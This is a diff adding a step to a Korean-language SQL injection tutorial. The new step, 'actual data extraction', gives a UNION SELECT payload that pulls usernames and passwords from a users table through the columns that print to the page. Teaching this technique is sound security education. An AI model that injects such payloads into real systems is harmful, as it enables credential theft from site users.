@@ -175,3 +175,11 @@ SELECT title, content FROM products WHERE id = '1' UNION SELECT username, passwo
 ```
 화면에 `a`, `b`, `c` 중 어떤 것이 보이는지 확인함.\
 보이는 위치가 바로 **데이터를 출력할 수 있는 컬럼**임.
+
+3. 실제 데이터 추출\
+   출력 가능한 컬럼 위치에 원하는 데이터를 넣음.
+```
+' UNION SELECT username, password, NULL FROM users -- -
+```
+이렇게 하면 원래 결과 대신(또는 함께) `users` 테이블의 데이터가 나타남.
+
